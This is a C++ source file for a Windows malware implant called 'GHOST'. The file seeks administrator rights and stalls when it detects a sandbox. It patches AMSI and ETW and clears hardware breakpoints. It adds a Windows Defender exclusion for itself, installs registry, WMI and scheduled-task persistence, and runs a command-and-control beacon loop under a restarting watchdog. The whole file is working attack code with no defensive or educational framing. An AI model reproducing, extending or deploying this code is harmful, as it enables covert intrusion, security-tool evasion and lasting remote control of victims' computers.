#include <windows.h>
#include <stdio.h>
#include <algorithm>
#include <shellapi.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

static void NtSleep(DWORD ms) {
    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
    static NtDelayExecution_t pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        if (h) pfn = reinterpret_cast<NtDelayExecution_t>(HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    } else Sleep(ms);
}

static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

// ─── Admin elevation ──────────────────────────────────────────────────────────
static BOOL EnsureElevated() {
    printf("[DEBUG] EnsureElevated: checking IsElevated\n"); fflush(stdout);
    if (IsElevated()) { printf("[DEBUG] EnsureElevated: already elevated\n"); fflush(stdout); return TRUE; }
    printf("[DEBUG] EnsureElevated: not elevated, getting exe path\n"); fflush(stdout);
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    printf("[DEBUG] EnsureElevated: calling ShellExecuteExW runas\n"); fflush(stdout);
    SHELLEXECUTEINFOW sei = {};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = L"runas";
    sei.lpFile = exePath;
    sei.lpParameters = L"--elevated";
    sei.nShow = SW_SHOW; // ponytail: SW_HIDE for release — SW_SHOW to see child console in debug
    BOOL ok = ShellExecuteExW(&sei);
    printf("[DEBUG] EnsureElevated: ShellExecuteExW returned %d, err=%lu\n", ok, GetLastError()); fflush(stdout);
    if (ok) { Sleep(1000); return FALSE; }
    MessageBoxW(NULL, L"GHOST requires administrator privileges.", L"Elevation Required", MB_ICONERROR | MB_OK);
    return FALSE;
}

DWORD WINAPI ImplantThread(LPVOID) {
    printf("[DEBUG] ImplantThread started\n");
    fflush(stdout);

    // ─── Sandbox detection → deep sleep then restart via watchdog ─────────
    if (SandboxCheck()) {
        printf("[DEBUG] Sandbox detected – entering deep sleep (1–4 hours).\n");
        fflush(stdout);
        DeepSleep();
        return 1; // non-zero → watchdog restarts; returning 0 terminates the process
    }

    DecoyLoop();
    printf("[DEBUG] DecoyLoop done\n");
    fflush(stdout);

    // ─── Syscalls ──────────────────────────────────────────────────────────
    printf("[DEBUG] Initializing syscalls...\n");
    fflush(stdout);
    while (!InitializeSyscalls()) {
        printf("[DEBUG] InitializeSyscalls failed – retrying in 5s\n");
        fflush(stdout);
        NtSleep(5000);
    }
    printf("[DEBUG] Syscalls initialized\n");
    fflush(stdout);

    // ─── Evasion ────────────────────────────────────────────────────────────
    printf("[DEBUG] Patching AMSI/ETW/HW-BP...\n");
    fflush(stdout);
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();
    printf("[DEBUG] Evasion applied\n");
    fflush(stdout);

    // ─── Defender exclusion (registry) ─────────────────────────────────────
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (IsElevated()) {
        printf("[DEBUG] Adding Defender exclusion (registry)\n");
        fflush(stdout);
        AddDefenderExclusion(exePath);
    }

    // ─── Persistence (all layers) ──────────────────────────────────────────
    printf("[DEBUG] Installing persistence...\n");
    fflush(stdout);
    InstallRegistryPersistence(exePath);
    if (!IsWmiPersistenceInstalled()) {
        InstallWmiPersistence(exePath);
        InstallWmiScriptPersistence(exePath);
    }
    if (!IsScheduledTaskInstalled()) {
        InstallScheduledTaskPersistence(exePath);
    }
    printf("[DEBUG] Persistence installed\n");
    fflush(stdout);

    // ─── Start C2 beacon loop (and Telegram poller inside) ──────────────
    printf("[DEBUG] Entering BeaconLoop...\n");
    fflush(stdout);
    BeaconLoop();

    printf("[DEBUG] BeaconLoop returned (clean exit)\n");
    fflush(stdout);
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
#ifdef DEBUG
    // ponytail: file log survives elevation — no console attachment needed
    FILE* dbgLog = nullptr;
    fopen_s(&dbgLog, "C:\\Users\\Public\\ghost_debug.log", "a");
    if (!dbgLog) {
        AllocConsole();
        FILE* f = nullptr;
        freopen_s(&f, "CONOUT$", "w", stdout);
        freopen_s(&f, "CONOUT$", "w", stderr);
    } else {
        // redirect stdout/stderr to the log file
        *stdout = *dbgLog;
        *stderr = *dbgLog;
    }
    atexit([]{ printf("\n[DEBUG] done.\n"); fflush(stdout); });
#endif
    printf("[DEBUG] WinMain entered pid=%lu\n", GetCurrentProcessId());
    fflush(stdout);

    // Elevate if not already admin
    printf("[DEBUG] Checking elevation flag...\n"); fflush(stdout);
    bool hasElevatedFlag = lpCmdLine && strstr(lpCmdLine, "--elevated") != nullptr;
    printf("[DEBUG] hasElevatedFlag=%d\n", (int)hasElevatedFlag); fflush(stdout);
    if (!hasElevatedFlag) {
        printf("[DEBUG] Calling EnsureElevated...\n"); fflush(stdout);
        if (!EnsureElevated()) {
            printf("[DEBUG] Elevation requested – exiting. Press Enter...\n");
            fflush(stdout);
            getchar();
            return 0;
        }
        printf("[DEBUG] EnsureElevated returned TRUE\n"); fflush(stdout);
    }
    printf("[DEBUG] Running as admin: %s\n", IsElevated() ? "YES" : "NO");
    fflush(stdout);
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    printf("[DEBUG] Getting kernel32 handle\n"); fflush(stdout);
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    printf("[DEBUG] kernel32=%p\n", hKernel32); fflush(stdout);
    if (!hKernel32) { printf("[DEBUG] kernel32 null – exit\n"); fflush(stdout); getchar(); return 0; }
    auto _CreateThread = HASHPROC(hKernel32, CreateThread);
    printf("[DEBUG] _CreateThread=%p\n", _CreateThread); fflush(stdout);
    auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
    printf("[DEBUG] _WaitForSingleObject=%p\n", _WaitForSingleObject); fflush(stdout);
    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
    auto _GetExitCodeThread = HASHPROC(hKernel32, GetExitCodeThread);
    printf("[DEBUG] _CloseHandle=%p _GetExitCodeThread=%p\n", _CloseHandle, _GetExitCodeThread); fflush(stdout);
    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
        printf("[DEBUG] HASHPROC resolution failed – exit. Press Enter...\n"); fflush(stdout);
        getchar(); return 0;
    }
    printf("[DEBUG] All procs resolved – entering watchdog\n"); fflush(stdout);

    // Watchdog loop
    DWORD restartCount = 0;
    while (true) {
        if (restartCount > 0) {
            DWORD backoffMs = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
            Sleep(backoffMs);
        }
        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
        if (!hThread) { Sleep(5000); ++restartCount; continue; }
        _WaitForSingleObject(hThread, INFINITE);
        DWORD exitCode = 0;
        _GetExitCodeThread(hThread, &exitCode);
        _CloseHandle(hThread);
        if (exitCode == 0) { printf("[DEBUG] Clean exit – terminating.\n"); fflush(stdout); return 0; }
        ++restartCount;
    }
}